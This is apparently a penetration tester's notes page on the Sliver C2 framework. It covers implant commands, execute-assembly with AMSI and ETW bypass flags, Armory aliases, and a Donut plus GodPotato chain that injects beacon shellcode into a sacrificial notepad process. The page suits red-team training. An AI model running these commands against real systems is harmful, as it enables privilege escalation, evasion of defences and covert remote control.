| 🏠 [Home](../../pentesting.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

-   [Basic Commands](#basic-commands){#toc-basic-commands}
    -   [File transfert](#file-transfert){#toc-file-transfert}
    -   [execute](#execute){#toc-execute}
    -   [execute-assembly](#execute-assembly){#toc-execute-assembly}
    -   [execute-assembly in-process](#execute-assembly-in-process){#toc-execute-assembly-in-process}
-   [Aliases and Extension(Armory)](#aliases-and-extensions-armory){#toc-aliases-and-extensions-armory}
    -   [Armory Mgt](#armory-mgt){#toc-armory-mgt}
    -   [Execution](#execution){#toc-execution}
    -   [Alias](#alias){#toc-alias}
-   [Donut](#donut){#toc-donut}


# Basic Commands

Common options:

-   `-t <sec>`: timeout

-   `--in-process`

-   `--amsi-bypass`

-   `--etw-bypass`

-   `--save`: save ouput to disk


-   `shell`: start an interactive shell

-   `getsystem`: create a new beacon with `NT AUTHORITY\SYSTEM`

-   `make-token`: create a token based on credentials

-   `impersonate`: Impersonate a logged in user

## File transfert

for `download` and `upload` commands, when specifying a Windows
directory, we need to escape the backslash character.

    upload pwn.exe C:\\temp\\pwn.exe

## execute

Execute a program on the remote system. Note that we must be cautious
running the execute command as it will open a command prompt or the
tool's GUI.

    execute -o certutil.exe
    # echo -en "whoami" | iconv -t UTF-16LE | base64 -w 0
    execute -o powershell -e dwBoAG8AYQBtAGkA



## execute-assembly

`execute-assembly` allows us to run .NET binaries on the target machine,
without uploading them. However, one caveat that `execute-assembly` has
is it will spawn a child process.

    execute-assembly <flags> <local_path_to_file> <params>

By default `execute-assembly` will spawn a `notepad.exe` process when we
run any .NET binary. This can be changed using the `--process` and
specifying the process.

We must exercise most caution when executing tools within the Sliver
session as defenders can easily look into the processes and deem it
malicious. Because of the parent-child processses relationship or by
looking into the .Net assemblies

The key takeaways that we get from those basic examples are:

-   Exercise extreme caution as notepad.exe or any other process that we
    specify will appear as a managed process whereas it might need to be
    unmanaged. One example is the http-session.exe as there is no reason
    to start notepad.exe.

-   Hardcoded strings such as Seatbelt that can be easily found in the
    process' memory.

-   Certain API calls can appear as unusual for the process that you are
    injecting into.

## execute-assembly in-process

Avoid to create a child process and allow access to bypasses (AMSI, ETW)

    execute-assembly --in-process --amsi-bypass --etw-bypass <local_path_to_file> <params>

# Aliases and Extensions (Armory)

Sliver allows an operator to extend the local client console and its
features by adding new commands based on third party tools. The easiest
way to install an alias or extension is using the
[armory](https://sliver.sh/docs?name=Armory). The armory is the Sliver
Alias and Extension package manager (introduced in Sliver v1.5), it
allows you to automatically install various 3rd party tools such as BOFs
and .NET tooling.

[Aliases and extensions](https://sliver.sh/docs?name=Aliases+and+Extensions) are
installed on the \"sliver client\"-side, and thus are not shared among
operators

difference between an alias and an extension:

-   An alias is essentially just a thin wrapper around the existing
    sideload and execute-assembly commands, and aliases cannot have
    dependencies.

-   An extension is a shared library that is reflectively loaded into
    the Sliver implant process, and is passed several callbacks to
    return data to the implant. As such these extensions must implement
    the Sliver API

Arguments passed to .NET assemblies and non-reflective PE extensions are
limited to 256 characters. This is due to a limitation in the Donut
loader Sliver is using. A workaround for .NET assemblies is to execute
them in-process, using the `--in-process` flag, or a custom BOF
extension like `inline-execute-assembly`. There is currently no
workaround for non-reflective PE extension.

## Armory Mgt
    armory
    armory install <soft>
    armory update

    # list aliases
    aliases
    # remove aliases
    aliases rm 
    # load aliases
    aliases load
    # install aliases
    aliases install


    # list extensions
    extensions
    # remove extensions
    extensions rm 
    # load extensions
    extensions load
    # install extensions
    extensions install

## Execution
```bash
<name> -- <params>
```
## Alias

A Sliver alias is nothing more than a folder inside
`~/.sliver-client/extensions/` or  `/.sliver-client/aliases/` with the
following structure:

-   an `alias.json` file

-   alias binaries in one of the following formats: .NET assemblies or
    shared libraries (`.so`, `.dll`, `.dylib`)

To load an alias in Sliver, use the `alias load` command:

    alias load /home/lesnuages/tools/misc/sliver-extensions/GhostPack/Rubeus

## Writing Aliases

make a folder somewhere with the binary and the `alias.json`

for exemple:
```json
{
  "name": "winPEAS",
  "version": "20251101-a416400b",
  "command_name": "winpeas",
  "original_author": "carlospolop",
  "repo_url": "https://github.com/peass-ng/PEASS-ng",
  "help": "Search for possible paths to escalate privileges on Windows hosts",
  "entrypoint": "Main",
  "allow_args": true,
  "default_args": "-h",
  "is_reflective": false,
  "is_assembly": true,
  "files": [
    {
      "os": "windows",
      "arch": "amd64",
      "path": "winPEASx64_ofs.exe"
    },
    {
      "os": "windows",
      "arch": "386",
      "path": "winPEASx86_ofs.exe"
    }
  ]
}
```

then run `aliases install <folder_absolut_path>`

restart or load `aliases load /home/jubeaz/.sliver-client/aliases/winpeas/alias.json`

## 


# Donut

[Donut](https://github.com/TheWover/donut) is a tool focused on creating
binary shellcodes that can be executed in memory; Donut will generate a
shellcode of a .NET binary, which can be executed via the
`execute-shellcode` argument in Sliver.

To take advantage of Donut, we would need to create either an http or
mtls beacon(s) beforehand.

To generate the binary shellcode using Donut, we are going to be using
the arguments `-a 2` responsible for choosing the architecture
(`2 = amd64`), the `-b 2` responsible for bypassing AMSI/WLDP/ETW
(`2 = Abort on fail`), `-p` followed by the arguments that are going to
be run from GodPotato and the `-o` to specify the output directory and
the name of the shellcode.

    git clone https://github.com/TheWover/donut
    cd donut/
    make -f Makefile
    ./donut 


    ./donut -i ./GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o ./godpotato.bin

To continue and use the execute-shellcode in memory, we would have to
create a sacrificial process of `notepad.exe` using `Rubeus.exe`
(previously downloaded from SharpCollection). Creating a sacrificial
process will enable us to not intervene with other processes that might
be crucial to the organization as they might crash.

    execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
    execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
